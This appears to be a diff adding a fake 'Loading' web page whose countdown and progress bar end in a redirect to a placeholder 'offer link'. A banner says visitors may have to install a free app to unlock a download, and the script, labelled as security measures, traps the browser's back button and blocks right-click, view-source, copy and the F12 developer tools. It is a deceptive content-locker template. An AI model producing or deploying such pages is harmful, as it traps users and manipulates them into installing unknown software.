@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .progress-text {
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .progress-percent {
+            color: #667eea;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.1s ease;
+        }
+
+        .timer {
+            font-size: 32px;
+            color: #667eea;
+            font-weight: 300;
+            margin: 20px 0;
+        }
+
+        .timer-label {
+            color: #999;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .note {
+            background: #fff3cd;
+            color: #856404;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-top: 20px;
+            border-left: 4px solid #ffc107;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            .title {
+                font-size: 20px;
+            }
+            .timer {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">⏳</div>
+        
+        <h1 class="title">Loading</h1>
+        <p class="subtitle">Please wait while we prepare your content</p>
+        
+        <div class="progress-info">
+            <span class="progress-text">Progress</span>
+            <span class="progress-percent" id="percent">0%</span>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+        
+        <div class="timer" id="timer">5</div>
+        <div class="timer-label">Seconds remaining</div>
+
+        <div class="note">
+            ⚠️ <strong>Note:</strong> You may be asked to install a free app to unlock the download.
+        </div>
+    </div>
+
+    <script>
+        // Security measures
+        history.pushState(null, null, window.location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, window.location.href);
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'a' || e.key === 'c' || e.key === 'v' || e.key === 'x')) {
+                e.preventDefault();
+            }
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        // Progress animation
+        let currentProgress = 0;
+        let timeLeft = 5;
+        
+        const progressBar = document.getElementById('progress');
+        const percentText = document.getElementById('percent');
+        const timerText = document.getElementById('timer');
+
+        function updateProgress() {
+            currentProgress += 2;
+            
+            if (currentProgress > 100) {
+                currentProgress = 100;
+            }
+            
+            progressBar.style.width = currentProgress + '%';
+            percentText.textContent = currentProgress + '%';
+            
+            if (currentProgress >= 100) {
+                setTimeout(function() {
+                    // Replace this URL with your offer link
+                    window.location.href = 'https://your-offer-link-here.com';
+                }, 300);
+                return;
+            }
+            
+            setTimeout(updateProgress, 50);
+        }
+
+        function updateTimer() {
+            timerText.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                timerText.textContent = '0';
+                return;
+            }
+            
+            timeLeft--;
+            setTimeout(updateTimer, 1000);
+        }
+
+        // Start the animations
+        updateProgress();
+        updateTimer();
+    </script>
+</body>
+</html>
